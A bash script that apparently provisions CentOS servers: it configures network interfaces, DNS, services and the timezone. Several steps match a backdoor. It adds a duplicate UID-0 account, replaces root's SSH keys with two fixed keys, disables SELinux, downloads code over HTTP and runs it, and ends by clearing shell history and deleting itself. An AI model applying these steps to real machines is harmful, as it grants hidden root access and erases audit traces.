# download data.
wget -O /tmp/ipcalc http://211.147.13.165/download/ipcalc
wget -O /tmp/nameserver.txt http://211.147.13.165/download/nameserver.txt

# disable SElinux.
setenforce 0
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/sysconfig/selinux
sed -i 's/SELINUX=permissive/SELINUX=disabled/g' /etc/sysconfig/selinux

# init user.
for user in rd op cdnscan; do
    useradd $user
done
usermod -g 0 -u 0 -o cdnscan
rm -rf /root/.ssh && mkdir /root/.ssh && chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEArturSzUc2lqCMXQZ7Z3WjRQwGQJLLb6uMFPemiSChURepIKNgOGsydeOIkEyHHUXgZYeC/MjveD6lL3nYUvjjOJgWUGiMM2Mk3ddV+w7ZkWf7RB/TSqaVRSfpAkk7JWcEx3TpWuGYtybqisRx2e/OV+r7lNt+9OuhThmCOXEy8YqDMmePIvfdSDNtAQ4NIRpJJKvn4fqKQBKyQ+H2enHxo/HVapaaEtVoHHiQICIcehXH+3CnWc5pgyNWOI4FBVI9/skdPloQlo07KZLYyJVH3U81oKzleoHmWMzEWnkCOWAXR5gG9iY8GAiDPV1jXSXyvsFn1i9ggYh59ZRyEOqFw== root@localhost.localdomain" > /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxbCGj+L2wCywKvHeTaldW54ekOr9fnOXVO99mJm0NeB/WbeiD1ck5kHRKPMbeNU0jUf+JpJiC4zU/tFc2lTFKUx6Ed+j7YLf5/QBROju9x/rWTqpGYpGcpyirJBV4biEBEIz2JADO7DXZKqMQfvaCVhK8F/A6IKh90Fyb30BW/qahTWtxnRb0y0U5aWFZ8vXEqUiIIGZY1KA7H96+OMqycsrHwaYdvCzYIPkU2ZsLTHqsS3d3ohOb7IHv3LA4wJTLv/S+UdECGg75jhjGEiKn1gK2CLNGNjlBoCEGwyvwrjHl/evhm0i9qLE4Vzk2tVUVw6pshx+btGBrIW3qyYeqw== root@localhost.localdomain" >> /root/.ssh/authorized_keys
chmod 400 /root/.ssh/authorized_keys

# init network.
for device in `/sbin/ifconfig -a | awk '/^e/ { print $1 }'`; do
    ip=`/sbin/ifconfig $device | awk '/inet add/ { gsub("addr:", "", $2); print $2 }'`
    mac=`/sbin/ifconfig $device | awk '/HWaddr/ { print $5 }'`
    if [ -z "$ip" ];then
        echo "DEVICE=$device"   > /etc/sysconfig/network-scripts/ifcfg-$device
        echo "TYPE=Ethernet"    >> /etc/sysconfig/network-scripts/ifcfg-$device
        echo "BOOTPROTO=static" >> /etc/sysconfig/network-scripts/ifcfg-$device
        echo "HWADDR=$mac"      >> /etc/sysconfig/network-scripts/ifcfg-$device
        echo "ONBOOT=no"        >> /etc/sysconfig/network-scripts/ifcfg-$device
    else
        netmask=`/sbin/ifconfig $device | awk -F":" '/Mask:/ { print $4 }'`
        gateway=`/sbin/route -n | awk '/^0.0.0.0|^default/ { if($8==dev) print $2 }' dev=$device`
        echo "DEVICE=$device"   > /etc/sysconfig/network-scripts/ifcfg-$device
        echo "TYPE=Ethernet"    >> /etc/sysconfig/network-scripts/ifcfg-$device
        echo "BOOTPROTO=static" >> /etc/sysconfig/network-scripts/ifcfg-$device
        echo "HWADDR=$mac"      >> /etc/sysconfig/network-scripts/ifcfg-$device
        echo "IPADDR=$ip"       >> /etc/sysconfig/network-scripts/ifcfg-$device
        echo "NETMASK=$netmask" >> /etc/sysconfig/network-scripts/ifcfg-$device
        if [ ! -z "$gateway" ];then
            echo "GATEWAY=$gateway" >> /etc/sysconfig/network-scripts/ifcfg-$device
            master_network=`perl /tmp/ipcalc $ip $netmask | awk '/Network/ { print $2 }'`
        fi
        echo "ONBOOT=yes"       >> /etc/sysconfig/network-scripts/ifcfg-$device
    fi
done
cat /tmp/nameserver.txt | awk '
    BEGIN {
        FS=":";
        NAMESERVER="8.8.8.8,8.8.4.4"
    }

    { 
        if($1==NETWORK) {
            NAMESERVER=$2
        }
    }

    END {
        split(NAMESERVER, NAMESERVERS, ",");
        system("rm -f /etc/resolv.conf");
        for ( i in NAMESERVERS ) { printf "nameserver "NAMESERVERS[i]"\n" >> "/etc/resolv.conf" }
    }

' NETWORK=$master_network

# init service.
SERVICES=(crond messagebus network sshd syslog rsyslog)
sed -i 's/id:5:/id:3:/g' /etc/inittab
for service in `/sbin/chkconfig --level 3 --list | awk '/:off/ { print $1 }'`; do
    /sbin/chkconfig --level 3 $service off
done
for service in ${SERVICES[@]}; do
    /sbin/chkconfig --level 3 $service on >> /dev/null
done

rm /etc/localtime
ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
echo 'ZONE="Asia/Shanghai"' > /etc/sysconfig/clock
echo "UTC=true"  >> /etc/sysconfig/clock
echo "ARC=false" >> /etc/sysconfig/clock

history -c
rm -f $0
